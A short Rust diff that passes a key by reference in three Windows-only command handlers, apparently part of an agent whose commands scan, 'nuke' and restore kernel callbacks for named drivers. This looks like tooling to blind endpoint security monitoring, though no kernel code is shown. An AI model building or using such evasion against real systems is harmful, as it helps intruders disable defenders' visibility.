@@ -1163,7 +1163,7 @@ pub async fn handle_command(
         #[cfg(all(windows, feature = "kernel-callback"))]
         Command::KernelCallbackScan => {
             let key_bytes = crypto.key_bytes();
-            match crate::kernel_callback::scan(key_bytes) {
+            match crate::kernel_callback::scan(&key_bytes) {
                 Ok(json) => Ok(json),
                 Err(e) => Err(format!("kernel callback scan failed: {e}")),
             }
@@ -1177,7 +1177,7 @@ pub async fn handle_command(
         #[cfg(all(windows, feature = "kernel-callback"))]
         Command::KernelCallbackNuke { ref drivers } => {
             let key_bytes = crypto.key_bytes();
-            match crate::kernel_callback::nuke(drivers, key_bytes) {
+            match crate::kernel_callback::nuke(drivers, &key_bytes) {
                 Ok(json) => Ok(json),
                 Err(e) => Err(format!("kernel callback nuke failed: {e}")),
             }
@@ -1191,7 +1191,7 @@ pub async fn handle_command(
         #[cfg(all(windows, feature = "kernel-callback"))]
         Command::KernelCallbackRestore => {
             let key_bytes = crypto.key_bytes();
-            match crate::kernel_callback::restore(key_bytes) {
+            match crate::kernel_callback::restore(&key_bytes) {
                 Ok(json) => Ok(json),
                 Err(e) => Err(format!("kernel callback restore failed: {e}")),
             }
